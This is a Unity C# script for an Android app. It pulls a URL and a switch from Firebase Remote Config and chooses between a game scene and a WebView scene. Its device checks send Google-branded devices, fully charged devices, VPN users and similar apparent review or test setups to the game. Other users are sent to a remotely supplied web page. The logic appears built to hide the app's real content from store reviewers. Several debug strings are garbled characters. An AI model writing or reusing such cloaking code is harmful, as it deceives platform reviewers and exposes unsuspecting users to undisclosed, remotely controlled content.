using UnityEngine;
using UnityEngine.SceneManagement;
using Firebase.RemoteConfig;
using Firebase.Extensions;
using System.Threading.Tasks;
using System;
using System.Net.NetworkInformation;

public class FireTest : MonoBehaviour
{
    [SerializeField] private GameObject _wifiPanel;

    private static string Link = "url";
    private static string Game = "Game";
    private static string WebView = "WebView";
    private static string To = "to";

    private void Start()
    {
            FetchDataAsync();

        //if (PlayerPrefs.HasKey(Link) == false)
        //{

        //}
        //else if (Application.internetReachability == NetworkReachability.NotReachable)
        //{
        //    Debug.Log("Network not available");

        //    _wifiPanel.SetActive(true);
        //}
        //else
        //{
        //    SceneManager.LoadScene(WebView);
        //}

    }

    private Task FetchDataAsync()
    {
      //  Debug.Log("Fetching data...");
        Task fetchTask = FirebaseRemoteConfig.DefaultInstance.FetchAsync(TimeSpan.Zero);
        return fetchTask.ContinueWithOnMainThread(FetchComplete);
    }

    private void FetchComplete(Task fetchTask)
    {
        if (!fetchTask.IsCompleted)
        {
           // Debug.LogError("Retrieval hasn't finished.");
            SceneManager.LoadScene(Game);
            return;
        }

        FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.DefaultInstance;
        var info = remoteConfig.Info;

        if (info.LastFetchStatus != LastFetchStatus.Success)
        {
          //  Debug.LogError($"{nameof(FetchComplete)} was unsuccessful\n{nameof(info.LastFetchStatus)}: {info.LastFetchStatus}");
            SceneManager.LoadScene(Game);
            return;
        }

        remoteConfig.ActivateAsync().ContinueWithOnMainThread(
          task => {

              string link = remoteConfig.GetValue(Link).StringValue;
              bool to = remoteConfig.GetValue(To).BooleanValue;

              Debug.Log(to);
              if (to)
              {

                  ToTrue(link);
              }
              else
              {
                  Debug.Log("‚’Œƒ");

                  ToFalse(link);
              }
          });
    }

    private void ToTrue(string link)
    {
        if (link ==""  || valVPN() || GetBatteryLevel() * 100f > 99 || IsGoogle())
        {
            SceneManager.LoadScene(Game);
        }
        else
        {
            PlayerPrefs.SetString(Link, link);

            SceneManager.LoadScene(WebView);
        }
    }

    private void ToFalse(string link)
    {
        if (link == "" || GetBatteryLevel() * 100f > 99 || IsGoogle())
        {
            Debug.Log("Ë√–¿");

            SceneManager.LoadScene(Game);
        }
        else
        {
            Debug.Log("¬≈¡");

            PlayerPrefs.SetString(Link, link);

            SceneManager.LoadScene(WebView);
        }
    }

    private bool IsGoogle()
    {
        Debug.Log("‚ „”√À≈");

        if (SystemInfo.deviceModel.ToLower().Contains("google") || SystemInfo.deviceName.ToLower().Contains("google"))
        {
            return true;
        }
        else
        {
            return false;
        }
    }

    bool valVPN()
    {
        if (NetworkInterface.GetIsNetworkAvailable())
        {
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface Interface in interfaces)
            {
                if (Interface.OperationalStatus == OperationalStatus.Up)
                {
                    if ((Interface.NetworkInterfaceType == NetworkInterfaceType.Ppp) &&
                    (Interface.NetworkInterfaceType != NetworkInterfaceType.Loopback))
                    {
                        IPv4InterfaceStatistics statistics = Interface.GetIPv4Statistics();
                        Debug.Log(Interface.Name + " " + Interface.NetworkInterfaceType.ToString() + " "
                    + Interface.Description);
                        return false;
                    }
                    else
                    {
                        Debug.Log("VPN Connection is lost!");
                        return true;
                    }
                }
            }
        }
        return false;
    }
    public static float GetBatteryLevel()
    {
        Debug.Log("‚ ·¿“¿–≈… ≈");

        if (Application.platform == RuntimePlatform.Android)
        {
            using (var javaUnityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
            {
                using (var currentActivity = javaUnityPlayer.GetStatic<AndroidJavaObject>("currentActivity"))
                {
                    using (var androidPlugin = new AndroidJavaObject("com.RSG.AndroidPlugin.AndroidPlugin", currentActivity))
                    {
                        return androidPlugin.Call<float>("GetBatteryPct");
                    }
                }
            }
        }

        return 1f;
    }

    //public bool IsEmulator()
    //{
    //    Debug.Log("‚ ›Ã”Àﬂ“Œ–≈");

    //    AndroidJavaClass osBuild;
    //    osBuild = new AndroidJavaClass("android.os.Build");
    //    string fingerPrint = osBuild.GetStatic<string>("FINGERPRINT");
    //    Debug.Log(fingerPrint.Contains("generic"));

    //    return fingerPrint.Contains("generic");
    //}
}
